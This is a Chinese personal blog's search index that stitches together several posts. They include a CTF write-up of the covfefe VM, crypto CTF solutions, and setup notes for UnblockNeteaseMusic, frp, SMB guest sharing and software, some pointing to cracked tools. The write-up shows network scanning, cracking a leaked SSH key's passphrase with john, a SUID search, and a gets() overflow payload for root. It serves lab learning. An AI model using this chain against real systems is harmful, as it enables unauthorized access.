","date":"2022-11-16","objectID":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/:0:1","tags":["CTF","ssh"],"title":"ssh私钥泄露","uri":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"},{"categories":["CTF"],"content":"二、信息搜集 1、探测靶机IP arp-scan arp-scan -l netdiscover ip a // 查看主机ip 192.168.130.128 netdiscover -r 192.168.130.128/24 // -r ip/mask,8/16/24分别表示探索子网的B/C/D段 出现多个ip无法区分，逐一nmap扫描，一般是有开放ssh服务 2、端口与服务扫描 nmap -sV 192.168.130.130 // -sV 探测开放端口以确定服务/版本信息 发现22-ssh、80-nginx、31337-python，开启了ssh和http服务 常用端口为0到1023，分析特殊端口31337，访问对应网站 192.168.130.130:31337，没有文件 3、目录扫描 dirsearch dirsearch -u 192.168.130.130:31337 发现robots.txt、/.ssh/id_rsa（私钥）和/.ssh/authorized_keys（认证关键字）等 参考：id_rsa 与 id_rsa.pub 文件详解 - fengMisaka - 博客园 (cnblogs.com) dirb dirb http://192.168.130.130:31337 访问robots.txt 依次访问以下路径，在http://192.168.130.130:31337/taxex/中看到第一个flag flag1{make_america_great_again} 使用网站访问下载/.ssh/id_rsa和/.ssh/authorized_keys，发现id_rsa需密码打开，authorized_keys看到疑似账户名simon // authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzG6cWl499ZGW0PV+tRaOLguT8+lso8zbSLCzgiBYkX/xnoZx0fneSfi93gdh4ynVjs2sgZ2HaRWA05EGR7e3IetSP53NTxk5QrLHEGZQFLId3QMMi74ebGBpPkKg/QzwRxCrKgqL1b2+EYz68Y9InRAZoq8wYTLdoUVa2wOiJv0PfrlQ4e9nh29J7yPgXmVAsy5ZvmpBp5FL76y1lUblGUuftCfddh2IahevizLlVipuSQGFqRZOdA5xnxbsNO4QbFUhjIlA5RrAs814LuA9t2CiAzHXxjsVW8/R/eD8K22TO7XEQscQjaSl/R4Cr1kNtUwCljpmpjt/Q4DJmExOR simon@covfefe ","date":"2022-11-16","objectID":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/:0:2","tags":["CTF","ssh"],"title":"ssh私钥泄露","uri":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"},{"categories":["CTF"],"content":"三、漏洞利用 1、破解秘钥 尝试使用私钥进行ssh连接 ssh -i id_rsa simon@192.168.130.130 失败，发现需输入秘钥id_rsa密码 locate ssh2john // 查看路径 /usr/share/john/ssh2john.py python /usr/share/john/ssh2john.py id_rsa \u003e rsacrack // 将秘钥信息转化为john可识别信息 zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rule rsacrack // 利用字典破解 john rsacrack // 其他方式，默认情况使用自带字典 /usr/share/john/password.lst 得到密码 starwars 另外，john对一个文件只能爆破一次，再爆破会报错（哭 Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) No password hashes left to crack (see FAQ) 需要查看上一次爆破结果可用以下命令 john --show filename 参考：使用john进行密码爆破 2、ssh连接 ssh -i id_rsa simon@192.168.130.130 报错为文件权限过高问题 修改权限为600 chmod 600 ./* ls -la 重新连接即可 参考：Linux文件权限设置 - EnochLin - 博客园 (cnblogs.com) 4、提升权限 ls、pwd、whoami查看相关信息，发现root下有个flag.txt，但无权查看，还有一个read_message.c（下面会用到 从根目录查找拥有suid特殊权限的文件，并重定向错误信息，防止打断查找 find / -perm -4000 2\u003e/dev/null 找到/usr/local/bin/read_message可执行文件，且具有root权限 打开上面找到的源码read_message.c，发现第二个flag flag2{use_the_source_luke} #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e // You're getting close! Here's another flag: // flag2{use_the_source_luke} int main(int argc, char *argv[]) { char program[] = \"/usr/local/sbin/message\"; char buf[20]; char authorized[] = \"Simon\"; printf(\"What is your name?\\n\"); gets(buf); // Only compare first five chars to save precious cycles: if (!strncmp(authorized, buf, 5)) { printf(\"Hello %s! Here is your message:\\n\\n\", buf); // This is safe as the user can't mess with the binary location: execve(program, NULL, NULL); } else { printf(\"Sorry %s, you're not %s! The Internet Police have been informed of this violation.\\n\", buf, authorized); exit(EXIT_FAILURE); } } 源码存在栈溢出问题，输入Simon+15个字符+/bin/sh，即Simonaaaaaaaaaaaaaaa/bin/sh，用/bin/sh覆盖program值运行，提权成功，查看flag.txt，得到 flag3{das_bof_meister} You did it! Congratulations, here's the final flag: flag3{das_bof_meister} 参考：对Linux|suid提权的一些总结 - FreeBuf网络安全行业门户 ","date":"2022-11-16","objectID":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/:0:3","tags":["CTF","ssh"],"title":"ssh私钥泄露","uri":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"},{"categories":["CTF"],"content":"四、总结 探测靶机ip，扫描端口与服务，着重关注http服务的特殊端口 扫描目录下隐藏文件 通过rsa私钥、认证关键字获取连接ssh方式与用户名，利用john爆破密码 suid提权，寻找具有root权限的可执行文件 一般在root文件夹下有关键信息 pwn的栈溢出 ","date":"2022-11-16","objectID":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/:0:4","tags":["CTF","ssh"],"title":"ssh私钥泄露","uri":"/ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"},{"categories":["computer"],"content":"项目 Release 0.25.3 · nondanee/UnblockNeteaseMusic (github.com) git clone https://github.com/nondanee/UnblockNeteaseMusic.git ","date":"2022-11-16","objectID":"/unblockneteasemusic/:0:1","tags":["computer","music"],"title":"UnblockNeteaseMusic","uri":"/unblockneteasemusic/"},{"categories":["computer"],"content":"nodejs Download | Node.js (nodejs.org) windows 直接下载对应版本安装 node -v # 测试 npm -v 更改npm配置 npm config set prefix 路径/node_global npm config set cache 路径/node_cache npm list -global # 查看 npm install express -g # 安装，测试cache路径（安装不了以管理员打开 npm list -g 更改环境变量 用户环境变量npm路径改为node_global路径 系统变量新建变量名NODE_PATH，值为路径\\node_global\\node_modules linux 下载source code后解压就好（版本过高困难会报错 ","date":"2022-11-16","objectID":"/unblockneteasemusic/:0:2","tags":["computer","music"],"title":"UnblockNeteaseMusic","uri":"/unblockneteasemusic/"},{"categories":["computer"],"content":"部署 windows 本地 node app.js -p 5000:5002 -e http://music.163.com bat脚本 @echo off tasklist | findstr -i \"cloudmusic.exe\" if ERRORLEVEL 1 ( echo Ready to run start \"\" \"D:\\CloudMusic296\\cloudmusic.exe\" )else ( echo Is running ) node app.js -p 5000:5002 -e http://music.163.com 开机自启动文件夹 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp linux 云服务器 centos vim /etc/systemd/system/UnblockNeteaseMusic.service [Unit] Description=UnblockNeteaseMusic service After=network.target Wants=network.target [Service] Type=simple ExecStart=/usr/local/lib/nodejs/bin/node /usr/local/UnblockNeteaseMusic-0.25.3/app.js -p 5000:5002 -e http://music.163.com -s Restart=always [Install] WantedBy=multi-user.target # 设置开机自启动 systemctl daemon-reload systemctl enable UnblockNeteaseMusic # 操作 systemctl restart UnblockNeteaseMusic # 重启 systemctl status UnblockNeteaseMusic -l # 显示状态 systemctl stop UnblockNeteaseMusic # 暂停 服务器断开后node停止运行，选择pm2管理 参考：UnblockNeteaseMusic 使用方法 – 如风 (desperadoj.com) npm config set registry https://registry.npm.taobao.org # 换源 npm install -g pm2 # 安装pm2 pm2 -v pm2 start app.js -- -s -p 5000:5002 # 启动 pm2 save # 保存 pm2 startup # 设置开机自启 pm2常见命令 pm2 start [] pm2 stop pm2 restart pm2 list pm2 delete pm2 show [] ","date":"2022-11-16","objectID":"/unblockneteasemusic/:0:3","tags":["computer","music"],"title":"UnblockNeteaseMusic","uri":"/unblockneteasemusic/"},{"categories":["computer"],"content":"使用 pc 网易云音乐软件 设置 ——\u003e 工具 ——\u003e 自定义代理，填写服务器ip（本地 127.0.0.1）和端口（5000），测试，确定 安卓 参考：redn3ck/unblockNeteaseMusic: yaml for unblockNeteaseMusic (github.com) UnblockNeteaseMusic 使用方法 – 如风 (desperadoj.com) ","date":"2022-11-16","objectID":"/unblockneteasemusic/:0:4","tags":["computer","music"],"title":"UnblockNeteaseMusic","uri":"/unblockneteasemusic/"},{"categories":["computer"],"content":"注意 软件只能用旧版的，新版代理不了 http://music.163.com和https://music.163.com看情况换 UnblockNeteaseMusic.service中的node和app.js用决定路径 ","date":"2022-11-16","objectID":"/unblockneteasemusic/:0:5","tags":["computer","music"],"title":"UnblockNeteaseMusic","uri":"/unblockneteasemusic/"},{"categories":["vscode"],"content":"IDE配置 ","date":"2022-11-16","objectID":"/vscode/:1:0","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["vscode"],"content":"python python 插件，选择python路径 ","date":"2022-11-16","objectID":"/vscode/:1:1","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["vscode"],"content":"C++ 挑把趁手的兵器——VSCode配置C/C++学习环境（小白向） - 知乎 (zhihu.com) ","date":"2022-11-16","objectID":"/vscode/:1:2","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["vscode"],"content":"php 配合phpstudy 参考：VScode+phpStudy搭建php代码调试环境_lceFIre的博客-CSDN博客_vscode+phpstudy 不debug，直接运行，可以选择，环境变量添加php.exe路径，配合vscode的扩展code runner ","date":"2022-11-16","objectID":"/vscode/:1:3","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["vscode"],"content":"html/css/js 不太算 ","date":"2022-11-16","objectID":"/vscode/:1:4","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["vscode"],"content":"go 配置 Visual Studio Code for Go 开发 | Microsoft Docs vs code配置go开发环境 - 知乎 (zhihu.com) 重启vscode再安装插件；得在当前文件夹下的文件夹中运行 ","date":"2022-11-16","objectID":"/vscode/:1:5","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["vscode"],"content":"C# 用VS Code写C# - springsnow - 博客园 (cnblogs.com) ","date":"2022-11-16","objectID":"/vscode/:1:6","tags":["vscode"],"title":"vscode","uri":"/vscode/"},{"categories":["computer"],"content":"电脑邻居 控制面板 ——\u003e 网络与Internet ——\u003e 网络与共享中心 ——\u003e 更改高级共享设置 ——\u003e 均启用共享 右键开始 ——\u003e 计算机管理 ——\u003e 本地用户与组 ——\u003e 用户 ——\u003e 右键“guest” ——\u003e 取消勾选禁用 ——\u003e 确认 win+R ——\u003e cmd ——\u003e gpedit.msc ——\u003e 计算机配置 ——\u003e Windows设置 ——\u003e 安全设置 ——\u003e 本地策略 ——\u003e用户权限分配 ——\u003e “拒绝从网络访问这台计算机”删除guest账户 ——\u003e 确认 计算机配置 ——\u003e Windows设置 ——\u003e 安全设置 ——\u003e 本地策略 ——\u003e 安全选项 ——\u003e ”网络访问：本地账户的共享和安全模式”修改为“仅来宾”，“账户：使用空白密码的本地账户只容许经过控制台登陆”设置为禁用 更新策略：win+R cmd输入 gpupdate /force 打开smb：控制面板 ——\u003e 程序 ——\u003e 程序与功能 ——\u003e 启用和关闭windows功能 ——\u003e 勾选 SMB ——\u003e 确认后重启 文件夹右键 ——\u003e 属性 ——\u003e 共享 ——\u003e 高级共享 ——\u003e 添加Everyone，设置权限 下载 ES文件浏览器，扫描，注意处于同一网络（可热点连接） 2-5步设置匿名登陆 ","date":"2022-11-16","objectID":"/%E7%94%B5%E8%84%91%E9%82%BB%E5%B1%85/:1:0","tags":["computer"],"title":"电脑邻居","uri":"/%E7%94%B5%E8%84%91%E9%82%BB%E5%B1%85/"},{"categories":["computer"],"content":"Windows ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:0","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"IDEA IDEA下载安装教程_J小黄的博客-CSDN博客_idea下载教程 ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:1","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"010editor 010editor v12.0.1 - 『逆向资源区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:2","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"XMind Xmind 破解教程升级为Xmind pro Windows和Mac教程 - 简书 (jianshu.com) ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:3","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"Typora https://exception.site/essay/how-to-free-use-intellij-idea ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:4","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"nc https://eternallybored.org/misc/netcat/ ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:5","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"WSL WSL——Kali子系统安装及其相关配置_Lilin_27的博客-CSDN博客_kali wsl 安装 ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:6","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["computer"],"content":"sage 数学库Sage安装和使用 - PamShao - 博客园 (cnblogs.com) Sage Mirror (aliyun.com) ","date":"2022-11-16","objectID":"/%E5%B7%A5%E5%85%B7/:1:7","tags":["computer"],"title":"工具","uri":"/%E5%B7%A5%E5%85%B7/"},{"categories":["blog"],"content":"选择 gitee 容量小，上传图片只能小于1mb，国内速度快 github 容量大，国内速度慢 github问题比较多，再加上图片不大，故选择gitee ","date":"2022-11-16","objectID":"/%E5%9B%BE%E5%BA%8A/:0:1","tags":["blog"],"title":"图床","uri":"/%E5%9B%BE%E5%BA%8A/"},{"categories":["blog"],"content":"搭建 gitee 创建公开仓库，其他配置随意 设置 ==\u003e 安全设置 ==\u003e 私人令牌 ==\u003e 生成新令牌，选择user_info和projects，提交，复制令牌 nodejs和PicGo Node.js (nodejs.org) Releases · Molunerfinn/PicGo (github.com) PicGo插件设置中安装gitee-uploader（按照不了，考虑网络或管理员运行 在图床设置的gitee中填写信息，repo是用户名/仓库名，branch默认master，token为上述令牌，path为文件夹名 PicGo可在设置选择时间戳重命名 Typora 在“偏好设置”的“图像” 中“插入图片时”选择上传图片，“上传服务”选择PicGo（app），选择软件路径，检验 github 仓库的令牌在 Setting ==\u003e Developer settings ==\u003e Personal access tokens，点击generate new token，选择repo，生成后复制令牌 在PicGo的github图床设置填写信息，分支默认main，其他同上 默认github图床不支持同步删除，可选择插件picgo-plugin-github-plus ","date":"2022-11-16","objectID":"/%E5%9B%BE%E5%BA%8A/:0:2","tags":["blog"],"title":"图床","uri":"/%E5%9B%BE%E5%BA%8A/"},{"categories":["ECS"],"content":"阿里云ECS配置远程桌面 ","date":"2022-11-16","objectID":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/:1:0","tags":["computer","ECS"],"title":"远程桌面","uri":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"},{"categories":["ECS"],"content":"初始设置 开发者成长计划 (aliyun.com) 完成新生任务，申请ECS，选择linux系统，我的是ubuntu_18_04_x64，其他配置随意。（后面改成centos系统了 在“云服务器ECS”——\u003e “实例与镜像”——\u003e “实例”选择应实例，查看公有IP地址，在“操作”——\u003e ”实例属性“——\u003e ”重置实例密码“ 重置密码，用于后续连接操作 在“云服务器ECS”——\u003e “网络与安全”——\u003e “安全组”选择上述实例所属安全组，进行修改，或者创建新的安全组，再回到实例操作中替换安全组 在“配置规则”中添加入方向，端口范围看后续要求，也可直接设为全部，源为0.0.0.0/0 选择实例后进行远程连接，选择Workbench远程连接，输入信息后登录 ","date":"2022-11-16","objectID":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/:1:1","tags":["computer","ECS"],"title":"远程桌面","uri":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"},{"categories":["ECS"],"content":"frp内网穿透 服务端 下载frp对应文件 fatedier/frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com) cd /usr/local # 选择安装位置 wget clone https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz # 下载对应版本 tar -zxvf frp_0.44.0_linux_amd64.tar.gz # 解压 mv frp_0.44.0_linux_amd64 frp # 重命名 rm frp_0.44.0_linux_amd64.tar.gz # 删除 cd frp # 进入文件夹 vim frps.ini # 配置文件 [common] bind_port = 7000 # 监听端口 dashboard_port = 7500 # 控制页面端口 token = # 连接服务器密码 dashboard_user = # 控制页面用户 dashboard_pwd = # 控制页面密码 端口可自行设置，需要在安全组开放对应端口，全开了就不用管了；如果有设置防火墙也需开放对应端口。 测试 ./frps -c frps.ini 正常运行不中断，再访问 IP:7500 ，输入用户名和密码后，成功访问 接下来进行frp开机自启动 cd /etc/systemd/system vim frp.service [Unit] Description=frp service After=network.target [Service] Type=simple User=root ExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.ini Restart=on-failure # or always, on-abort, etc [Install] WantedBy=multi-user.target systemctl daemon-reload systemctl enable frp 然后可以通过systemctl status frp查看状态和运行日志，systemctl restart frp、systemctl stop frp进行开启或关闭frp 查看和删除进程 ps -aux kill -9 [pid] 客户端 windows10 下载对应版本，解压，进入文件夹，配置frpc.ini [common] server_addr = 服务器IP server_port = 服务器监听接口 token = 连接服务器密码 tls_enable = true [rdp] # 配置远程桌面的接口，Windows的RD Client一般为3389接口 type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 3389 [smb] # 这里是配置网络文件共享系統，直接照抄即可 type = tcp local_ip = 127.0.0.1 local_port = 445 remote_port = 7002 [ssh] # 配置ssh接口 type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 remote_port可以自己设置，需要在安全组和防火墙（如果有）开放对应端口 tls_enable设置是为了解决运行时出现 i/o time out 的错误 参考：https://github.com/fatedier/frp/issues/2865 打开终端运行 .\\frpc.exe -c frpc.ini 正常运行不中断 设置后台运行，创建 frp.bat @echo off if \"%1\" == \"h\" goto begin mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%~nx0\"\" h\",0)(window.close)\u0026\u0026exit :begin REM cd D:\\frp_0.44.0_windows_amd64 frpc -c frpc.ini exit 双击即可运行，可在任务管理器查看是否运行，再到服务器查看日志，是否连接成功 可将 frp.bat 快捷方式 放到 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp 路径下实现开机自启动 ","date":"2022-11-16","objectID":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/:1:2","tags":["computer","ECS"],"title":"远程桌面","uri":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"},{"categories":["ECS"],"content":"远程桌面 被控端设置 windows10专业版，在“设置”——\u003e“远程桌面”启动远程桌面，在“显示设置”启用网络发现，在“高级设置”启用网络验证，在“用户账号”中添加可访问的用户 控制端设置 WIndows 直接搜索打开远程桌面连接，输入IP连接，输入被控端的用户和密码即可连接 Android 下载安装 Microsoft Remote Desktop，点击右上角加号，点击 DESKTOP，输入IP和用户密码进入，可在DISPLAY设置分辨率和缩放。 其他设备同理 ","date":"2022-11-16","objectID":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/:1:3","tags":["computer","ECS"],"title":"远程桌面","uri":"/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"},{"categories":null,"content":"游戏规则 点击小圆点，围住小猫。 你点击一次，小猫走一次。 直到你把小猫围住（赢），或者小猫走到边界并逃跑（输）。 ","date":"0001-01-01","objectID":"/game/catch-the-cat/:1:0","tags":null,"title":"逮住那只猫!","uri":"/game/catch-the-cat/"},{"categories":["ctf"],"content":"Crypto ","date":"0001-01-01","objectID":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/:1:0","tags":["ctf"],"title":"祥云杯2022","uri":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/"},{"categories":["ctf"],"content":"tracing task.py from secret import p, q, flag from Crypto.Util.number import bytes_to_long def gcd(a, b): s = 0 while b != 0: print(a, b) if isOdd(a): if isOdd(b): a = a - b a = rshift1(a) if a \u003c b: a, b = b, a else: b = rshift1(b) if a \u003c b: a, b = b, a else: if isOdd(b): a = rshift1(a) if a \u003c b: a, b = b, a else: a = rshift1(a) b = rshift1(b) s += 1 if s: return lshift(a, s) return a def isOdd(a): return a \u0026 1 == 1 def rshift1(a): return a \u003e\u003e 1 def lshift(a, s): return a \u003c\u003c s n = p * q e = 65537 phi = (p - 1) * (q - 1) assert gcd(phi, e) == 1 c = pow(bytes_to_long(flag), e, n) print(c) print(n) 根据trace.out逆向得到phi exp.py import gmpy2 from Crypto.Util.number import long_to_bytes e = 65537 c = 64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102 n = 113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301 a = 1 b = 0 f = open(\"trace.out\",\"r\") lines = f.readlines() for i in range(12621): line = lines[-1-i] if \"a, b = b, a\" in line: a, b = b, a elif \"a = rshift1(a)\" in line: a = a \u003c\u003c 1 elif \"a = a - b\" in line: a = a + b elif \"b = rshift1(b)\" in line: b = b \u003c\u003c 1 else: continue # print(\"phi = \",a) # print(\"e = \", b) phi = 113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813744206060043230633366541996120990867169768523014939944773017185662017479011094588132516102178922759206005551241577259317764398494195585166584573218495824732 e = 65537 d = gmpy2.invert(e,phi) m = pow(c,d,n) print(long_to_bytes(m)) # flag{a526344-a8c7-411d-bf53-ef6a2479de1a} ","date":"0001-01-01","objectID":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/:1:1","tags":["ctf"],"title":"祥云杯2022","uri":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/"},{"categories":["ctf"],"content":"Little little fermat chall.py from Crypto.Util.number import * from random import * from libnum import * import gmpy2 from secret import x flag = b'?????????' m = bytes_to_long(flag) def obfuscate(p, k): nbit = p.bit_length() while True: l1 = [getRandomRange(-1, 1) for _ in '_' * k] l2 = [getRandomRange(100, nbit) for _ in '_' * k] l3 = [getRandomRange(10, nbit//4) for _ in '_' * k] l4 = [getRandomRange(2, 6) for _ in '_' *k] A = sum([l1[_] * 2 ** ((l2[_]+l3[_])//l4[_]) for _ in range(0, k)]) q = p + A if isPrime(q) * A != 0: return q p = getPrime(512) q = obfuscate(p, 5) e = 65537 n = p*q print(f'n = {n}') assert 114514 ** x % p == 1 m = m ^ (x**2) c = pow(m, e, n) print(f'c = {c}') ''' n = 141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393 c = 81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883 ''' p和q相差不大，利用平方差遍历求出，factordb也能直接分解n 利用费马小定理求出x=p-1 exp.py import gmpy2 from Crypto.Util.number import * e = 65537 n = 141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393 c = 81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883 a = gmpy2.iroot(n, 2)[0] while True: tmp = pow(a, 2) - n if gmpy2.is_square(tmp): b = gmpy2.iroot(tmp, 2)[0] p = a + b q = a - b print(p) # p = 11887853772894265642834649929578157180848240939084164222334476057487485972806971092902627112665734648016476153593841839977704512156756634066593725142934001 print(q) # q = 11887853772894265642834649929578157180848240939084164222334476057487485972806971092902627112665734646483980612727952939084061619889139517526028673988305393 break a += 1 phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) x = p-1 m = m^(x**2) print(long_to_bytes(m)) # b'flag{I~ju5t_w@nt_30_te11_y0u_how_I_@m_f3ll1ng~}45108#@7++3@79?3328?!!@08#712/+963-60#9-/83#+/1@@=59!/84@?3#4!4=-9542/##' ","date":"0001-01-01","objectID":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/:1:2","tags":["ctf"],"title":"祥云杯2022","uri":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/"},{"categories":["ctf"],"content":"common_rsa task.py from Crypto.Util.number import getPrime, isPrime, bytes_to_long, inverse from math import lcm from secret import flag def gen(g): bits = 512 - g.bit_length() while True: a = getPrime(bits) p = 2 * a * g + 1 if isPrime(p): return p flag = bytes_to_long(flag) g = getPrime(320) p = gen(g) q = gen(g) n = p * q d = getPrime(135) phi = lcm(p - 1, q - 1) e = inverse(d, phi) c = pow(flag, e, n) print(\"n = {}\".format(n)) print(\"e = {}\".format(e)) print(\"c = {}\".format(c)) out.txt n = 253784908428481171520644795825628119823506176672683456544539675613895749357067944465796492899363087465652749951069021248729871498716450122759675266109104893465718371075137027806815473672093804600537277140261127375373193053173163711234309619016940818893190549811778822641165586070952778825226669497115448984409 e = 31406775715899560162787869974700016947595840438708247549520794775013609818293759112173738791912355029131497095419469938722402909767606953171285102663874040755958087885460234337741136082351825063419747360169129165 c = 97724073843199563126299138557100062208119309614175354104566795999878855851589393774478499956448658027850289531621583268783154684298592331328032682316868391120285515076911892737051842116394165423670275422243894220422196193336551382986699759756232962573336291032572968060586136317901595414796229127047082707519 p-1和q-1都有公因子2g，想到Pollard’s rho algorithm分解n [密码学学习笔记 之 浅析Pollard’s rho algorithm及其应用 | Van1sh的小屋 (jayxv.github.io)](https://jayxv.github.io/2019/11/11/密码学学习笔记之浅析Pollard’s rho algorithm及其应用/) 跟羊城杯2021easy_rsa类似 2021羊城杯比赛复现（Crypto） - 01am - 博客园 (cnblogs.com) 但本题g有192位，用以上脚本跑不出来，放弃 factordb能直接分解n，得到p和q import gmpy2 from Crypto.Util.number import * n = 253784908428481171520644795825628119823506176672683456544539675613895749357067944465796492899363087465652749951069021248729871498716450122759675266109104893465718371075137027806815473672093804600537277140261127375373193053173163711234309619016940818893190549811778822641165586070952778825226669497115448984409 e = 31406775715899560162787869974700016947595840438708247549520794775013609818293759112173738791912355029131497095419469938722402909767606953171285102663874040755958087885460234337741136082351825063419747360169129165 c = 97724073843199563126299138557100062208119309614175354104566795999878855851589393774478499956448658027850289531621583268783154684298592331328032682316868391120285515076911892737051842116394165423670275422243894220422196193336551382986699759756232962573336291032572968060586136317901595414796229127047082707519 p = 12080882567944886195662683183857831401912219793942363508618874146487305963367052958581455858853815047725621294573192117155851621711189262024616044496656907 q = n//p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) # b'flag{9aecf8d8-6966-4ffa-96b0-2e744d28baf2}' ","date":"0001-01-01","objectID":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/:1:3","tags":["ctf"],"title":"祥云杯2022","uri":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/"},{"categories":["ctf"],"content":"fill chall.py from Crypto.Util.number import * from random import * from gmpy2 import gcd from numpy import dot nbits = 32 msg = getRandomNBitInteger(nbits) flag = b'flag{sha256(msg)}' tmp_m = bin(msg)[2:] f_list = [] for i in range(len(tmp_m)): f_list.append(int(tmp_m[i])) r_list =[randint(20, 50)] for i in range(nbits - 1): r_list.append(randint(2 * r_list[-1], 3 * r_list[-1])) while True: A = randint(2 * r_list[-1] + 1, 3 * r_list[-1]) B = randint(2 * r_list[-1] + 1, 3 * r_list[-1]) if gcd(A, B) == 1: break M = [A * x % B for x in r_list] S = dot(f_list, M) print(S) seed = getRandomNBitInteger(30) s = [0] * nbits s[0] = seed m = getRandomNBitInteger(20) c = getPrime(24) n = 991125622 for i in range(1, nbits): s[i] = (s[i-1]*m+c)%n print(s[0], s[1], s[2]) for t in range(nbits): M[t] = M[t] + s[t] print(M) ''' 492226042629702 562734112 859151551 741682801 M = [19621141192340, 39617541681643, 3004946591889, 6231471734951, 3703341368174, 48859912097514, 4386411556216, 11028070476391, 18637548953150, 29985057892414, 20689980879644, 20060557946852, 46908191806199, 8849137870273, 28637782510640, 35930273563752, 20695924342882, 36660291028583, 10923264012354, 29810154308143, 4444597606142, 31802472725414, 23368528779283, 15179021971456, 34642073901253, 44824809996134, 31243873675161, 27159321498211, 2220647072602, 20255746235462, 24667528459211, 46916059974372] ''' Crypto-LCG（线性同余方程） | 此间的少年 (gitee.io) 根据LCG和s[0]、s[1]、s[2]推出乘数m和增量c，进而推出s，得到M S是f_list和M内积，f_list由0和1组成，相对于求M中哪几个数加起来为S ","date":"0001-01-01","objectID":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/:1:4","tags":["ctf"],"title":"祥云杯2022","uri":"/%E7%A5%A5%E4%BA%91%E6%9D%AF2022/"}]